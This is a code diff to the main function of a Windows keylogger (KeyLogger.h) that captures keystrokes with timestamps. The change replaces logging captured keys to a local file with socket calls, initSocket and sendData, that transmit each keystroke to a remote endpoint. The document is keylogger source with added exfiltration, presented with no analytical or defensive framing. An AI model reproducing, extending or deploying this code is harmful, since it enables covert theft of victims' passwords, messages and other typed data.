@@ -1,5 +1,4 @@
 #include "KeyLogger.h"
-#include <ctime>
 
 
 int main(){
@@ -8,7 +7,16 @@ int main(){
 	FILE* fp;
 
 	bool flagSpecialKey = false;
-	FreeConsole();
+
+	//FreeConsole();
+	int isResult = initSocket();
+
+	if (isResult < 0) {
+		printf("Some error Occured...!\n");
+		return -1;
+	}
+
+	printf("Scoket initiated...\n");
 
 	while (true) {
 
@@ -24,10 +32,8 @@ int main(){
 				memcpy(subbuff, &dt[0], 24);
 				subbuff[24] = '\0';
 
-				
+				switch (i){
 
-				switch (i)
-				{
 				case VK_RETURN:
 					strcat(subbuff, " : RETURN\n");
 					flagSpecialKey = true;
@@ -130,8 +136,12 @@ int main(){
 					break;
 				default:
 					if (!flagSpecialKey) {
-						fprintf(fp, "%s : ", subbuff);
-						fprintf(fp, "%c\n", i);
+						//fprintf(fp, "%s : ", subbuff);
+						//fprintf(fp, "%c\n", i);
+						
+						sprintf(subbuff, "%s%s%c\n",subbuff, " : ", i);
+						sendData(subbuff);
+
 					}
 					else {
 						flagSpecialKey = false;
@@ -139,11 +149,16 @@ int main(){
 					break;
 				}
 				
-				if (flagSpecialKey)
-					fprintf(fp, "%s", subbuff);
+				if (flagSpecialKey) {
+					//fprintf(fp, "%s\n", subbuff);
+					sendData(subbuff);
+					flagSpecialKey = false;
+				}
 			}
 		}
 		fclose(fp);
+		
 	}
 	
+	closeSocket();
 }
